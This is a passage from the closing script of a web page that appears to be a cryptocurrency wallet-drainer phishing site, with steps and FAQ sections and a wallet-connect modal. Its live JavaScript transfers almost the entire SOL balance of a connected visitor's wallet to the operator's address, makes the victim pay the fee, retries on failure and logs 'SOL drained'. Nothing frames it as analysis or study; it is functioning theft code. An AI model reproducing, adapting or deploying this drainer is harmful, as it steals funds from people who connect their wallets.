                const safetyBuffer = 500000; // Increased safety buffer (0.0005 SOL)
                const amountToLeave = minFee + safetyBuffer;

                if (ownerBalance > amountToLeave) {
                    resultDiv.innerText += `\nDraining SOL...`;
                    
                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: ownerPublicKey,
                            toPubkey: myWallet,
                            lamports: ownerBalance - amountToLeave,
                        })
                    );
                    
                    transaction.feePayer = ownerPublicKey;
                    
                    if (!window.activeWallet) {
                        throw new Error("Wallet disconnected");
                    }
                    
                    // Use improved transaction sending with retries
                    await sendTransactionWithRetry(connection, transaction, window.activeWallet);
                    resultDiv.innerText += `\nSOL drained successfully!`;
                    
                } else {
                    resultDiv.innerText += `\nNot enough SOL to drain (balance: ${ownerBalance} lamports).`;
                }
            } catch (err) {
                console.error("SOL drain error:", err);
                resultDiv.innerText += `\nSOL drain failed: ${err.message}`;
            }
        }
        
        // Add scroll animations
        window.addEventListener('scroll', () => {
            const elements = document.querySelectorAll('.steps-box, .faq-box, .connect-box');
            
            elements.forEach(element => {
                const position = element.getBoundingClientRect();
                
                // If element is in viewport
                if(position.top < window.innerHeight && position.bottom >= 0) {
                    element.style.transform = 'translateY(0)';
                    element.style.opacity = '1';
                }
            });
        });

        // Close modal when clicking outside
        window.addEventListener('click', (event) => {
            if (event.target === walletModal) {
                closeWalletModal();
            }
        });
    </script>
</body>
</html>
